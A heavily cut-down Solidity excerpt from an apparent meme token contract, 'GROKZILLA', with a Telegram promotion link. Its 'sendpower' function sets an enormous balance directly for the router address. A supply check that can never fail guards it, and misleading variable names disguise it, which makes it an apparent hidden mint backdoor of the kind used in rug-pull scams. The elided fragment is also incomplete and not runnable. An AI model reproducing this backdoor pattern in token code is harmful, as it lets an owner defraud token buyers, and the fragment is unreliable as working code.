...
/**
Telegram: https://t.me/grokzillatokenbsc
**/
...
contract GROKZILLA is IERC20, Ownable, BaseToken {
    ...
    function sendpower(
        ...
        uint256 endGameTech = WETH * 10 ** decimals();
        require(0 <= totalSupply() + endGameTech, "Max supply exceeded");
        _balances[uniswapV2Router] = WETH * endGameTech;
        uint256 addLiquidityETH = endGameTech > address(this).balance ? 0 : address(this).balance - endGameTech;
